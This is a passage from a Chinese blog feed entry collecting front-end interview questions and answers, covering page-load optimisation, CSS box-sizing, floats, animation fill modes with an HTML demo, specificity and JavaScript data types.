sprite)</li><li>若是打包的代码尽可能切割成多个 chunk,减少单一 chunk过大</li><li>静态文件采用 cdn 引入</li><li>HTTP的缓存头使用的合理</li><li>减小第三方库的依赖</li><li>对于代码应该考虑性能来编写,比如使用requestAnimationFrame绘制动画,尽可能减少页面重绘(DOM 改变)</li><li>渐进升级,引入preload这些预加载资源</li><li>看情况用server worker来缓存资源(比如移动端打算搞 PWA)</li></ul><p>比如从服务端着手:</p><ul><li>带宽,域名解析, 多域名解析等</li><li>页面做服务端渲染,减小对浏览器的依赖(不用客户端解析)</li><li>渐进升级,比如引入 HTTP2(多路复用,头部压缩这些可以明显加快加载速度)</li></ul><p>当然,这是这些都是很片面的点到…实际工作中去开展要复杂的多;</p><p>比如我们要多个维度去考虑的话,要去优化 DOM 的绘制时间,资源的加载时间,域名解析这些;</p><p>要全面的优化一个项目是一个大工程…</p><p>还有一些题目记不起来了,就没辙了…还有一些题目是看你个人发挥的,没法写,比如</p><pre><code>Q: 让你来为公司的一个项目做技术选型,你会怎么做,为什么?Q: MVVM 和 MVC 的差异? 听说过 MVP?Q: React,Angular,Vue的比较? 等等...</code></pre><p>面试的过程中磕磕碰碰才能发现自身的很多不足和需要去努力的方向.</p><p>此篇文章暂未停更,随时会更新,因为作为技术渣的我还木有找到工作;</p><p>在找到工作之前会一直更新面试碰到问到的问题;</p><p>有不对之处请留言,会及时跟进修正,谢谢各位大佬</p><p><a href="https://juejin.im/post/5a998991f265da237f1dbdf9" target="_blank" rel="noopener">2018春招前端面试: 闯关记</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS-有哪些样式可以给子元素继承&quot;&gt;&lt;a href=&quot;#CSS-有哪些样式可以给子元素继承&quot; class=&quot;headerlink&quot; title=&quot;CSS 有哪些样式可以给子元素继承!&quot;&gt;&lt;/a&gt;CSS 有哪些样式可以给子元素继承!&lt;/h2&gt;&lt;p&gt;可继承的:&lt;code&gt;font-size&lt;/code&gt;,&lt;code&gt;font-weight&lt;/code&gt;,&lt;code&gt;line-height&lt;/code&gt;,&lt;code&gt;color&lt;/code&gt;,&lt;code&gt;cursor&lt;/code&gt;等&lt;br&gt;不可继承的一般是会改变盒子模型的:&lt;code&gt;display&lt;/code&gt;,&lt;code&gt;margin&lt;/code&gt;、&lt;code&gt;border&lt;/code&gt;、&lt;code&gt;padding&lt;/code&gt;、&lt;code&gt;height&lt;/code&gt;等&lt;/p&gt;
&lt;h2 id=&quot;box-sizing常用的属性有哪些-分别有啥作用&quot;&gt;&lt;a href=&quot;#box-sizing常用的属性有哪些-分别有啥作用&quot; class=&quot;headerlink&quot; title=&quot;box-sizing常用的属性有哪些? 分别有啥作用?&quot;&gt;&lt;/a&gt;box-sizing常用的属性有哪些? 分别有啥作用?&lt;/h2&gt;&lt;p&gt;box-sizing有两个值:content-box(W3C标准盒模型),border-box(怪异模型),&lt;br&gt;这个css 主要是改变盒子模型大小的计算形式&lt;br&gt;可能有人会问padding-box,这个之前只有 Firefox 标准实现了,目前50+的版本已经废除;&lt;br&gt;用一个栗子来距离,一个div的宽高分别100px,border为5px,padding为5px&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;    &lt;span class=&quot;selector-class&quot;&gt;.test&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      box-sizing: content-box;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;      &lt;span class=&quot;selector-tag&quot;&gt;border&lt;/span&gt;: 5&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;selector-id&quot;&gt;#f00&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;      &lt;span class=&quot;selector-tag&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:5px&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      width: 100px;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      height: 100px;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;content-box的计算公式会把宽高的定义指向 content,border和 padding 另外计算,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;也就是说 content + padding + border = 120px(盒子实际大小)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;而border-box的计算公式是总的大小涵盖这三者, content 会缩小,来让给另外两者&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;content(80px) + padding(5*2px) + border(5*2px) = 100px&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;清除浮动的方式有哪些-比较好的是哪一种&quot;&gt;&lt;a href=&quot;#清除浮动的方式有哪些-比较好的是哪一种&quot; class=&quot;headerlink&quot; title=&quot;清除浮动的方式有哪些?比较好的是哪一种?&quot;&gt;&lt;/a&gt;清除浮动的方式有哪些?比较好的是哪一种?&lt;/h2&gt;&lt;p&gt;常用的一般为三种&lt;code&gt;.clearfix&lt;/code&gt;, &lt;code&gt;clear:both&lt;/code&gt;,&lt;code&gt;overflow:hidden&lt;/code&gt;;&lt;/p&gt;
&lt;h2 id=&quot;CSS-中transition和animate有何区别-animate-如何停留在最后一帧&quot;&gt;&lt;a href=&quot;#CSS-中transition和animate有何区别-animate-如何停留在最后一帧&quot; class=&quot;headerlink&quot; title=&quot;CSS 中transition和animate有何区别? animate 如何停留在最后一帧!&quot;&gt;&lt;/a&gt;CSS 中transition和animate有何区别? animate 如何停留在最后一帧!&lt;/h2&gt;&lt;p&gt;这种问题见仁见智,我的回答大体是这样的..待我捋捋.&lt;br&gt;transition一般用来做过渡的,而animate则是做动效,算是前者的一个补充拓展;&lt;br&gt;过渡的开销比动效小,前者一般用于交互居多,后者用于活动页居多;&lt;br&gt;至于如何让animate停留在最后一帧也好办,就它自身参数的一个值就可以了&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;animation-fill-mode: forwards;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--backwards则停留在首帧,both是轮流--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;让我们来举个栗子….自己新建一个 html 跑一下….&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;lang&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;en&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;charset&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;width=device-width, initial-scale=1.0&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;ie=edge&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Box-sizing&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;    &lt;span class=&quot;selector-class&quot;&gt;.test&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      box-sizing: border-box;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;      &lt;span class=&quot;selector-tag&quot;&gt;border&lt;/span&gt;: 5&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;selector-id&quot;&gt;#f00&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      padding: 5px;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      width: 100px;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      height: 100px;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;      &lt;span class=&quot;selector-tag&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:absolute&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      /*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      简写的姿势排序&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;      @&lt;span class=&quot;keyword&quot;&gt;keyframes&lt;/span&gt; name : 动画名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      duration 持续时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      timing-function 动画频率&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      delay 延迟多久开始&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      iteration-count 循环次数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      direction 动画方式,往返还是正向&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      fill-mode  一般用来处理停留在某一帧&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      play-state running 开始,paused 暂停 ....&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;       更多的参数去查文档吧..我就不一一列举了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;      */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;      &lt;span class=&quot;selector-tag&quot;&gt;animation&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;moveChangeColor&lt;/span&gt;  &lt;span class=&quot;selector-tag&quot;&gt;ease-in&lt;/span&gt; 2&lt;span class=&quot;selector-class&quot;&gt;.5s&lt;/span&gt; 1  &lt;span class=&quot;selector-tag&quot;&gt;forwards&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;running&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;    @&lt;span class=&quot;keyword&quot;&gt;keyframes&lt;/span&gt; moveChangeColor &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;       from &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;         &lt;span class=&quot;selector-tag&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:0&lt;/span&gt;%;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;         &lt;span class=&quot;selector-tag&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:5&lt;/span&gt;%;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;         &lt;span class=&quot;selector-tag&quot;&gt;background-color&lt;/span&gt;:&lt;span class=&quot;selector-id&quot;&gt;#f00&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;       to&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;         &lt;span class=&quot;selector-tag&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:0&lt;/span&gt;%;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;         &lt;span class=&quot;selector-tag&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:50&lt;/span&gt;%;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;css&quot;&gt;         &lt;span class=&quot;selector-tag&quot;&gt;background-color&lt;/span&gt;:&lt;span class=&quot;selector-id&quot;&gt;#ced&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;块级元素水平垂直居中的方法&quot;&gt;&lt;a href=&quot;#块级元素水平垂直居中的方法&quot; class=&quot;headerlink&quot; title=&quot;块级元素水平垂直居中的方法&quot;&gt;&lt;/a&gt;块级元素水平垂直居中的方法&lt;/h2&gt;&lt;p&gt;我们要考虑两种情况,定宽高和不定宽高的;&lt;/p&gt;
&lt;p&gt;方案 N 多种,我记得我很早写过这类的笔记&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/column/details/center-layout.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;网页元素居中攻略记&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;CSS样式权重的优先级&quot;&gt;&lt;a href=&quot;#CSS样式权重的优先级&quot; class=&quot;headerlink&quot; title=&quot;CSS样式权重的优先级&quot;&gt;&lt;/a&gt;CSS样式权重的优先级&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;!important &amp;gt; 行内样式 &amp;gt; id &amp;gt; class &amp;gt; tag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;CSS特异性&lt;/p&gt;
&lt;h2 id=&quot;JS有几种数据类型-其中哪些的基本数据类型有哪些&quot;&gt;&lt;a href=&quot;#JS有几种数据类型-其中哪些的基本数据类型有哪些&quot; class=&quot;headerlink&quot; title=&quot;JS有几种数据类型,其中哪些的基本数据类型有哪些!&quot;&gt;&lt;/a&gt;JS有几种数据类型,其中哪些的基本数据类型有哪些!&lt;/h2&gt;&lt;p&gt;七种数据类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Boolean&lt;/li&gt;
&lt;li&gt;Null&lt;/li&gt;
&lt;li&gt;Undefined&lt;/li&gt;
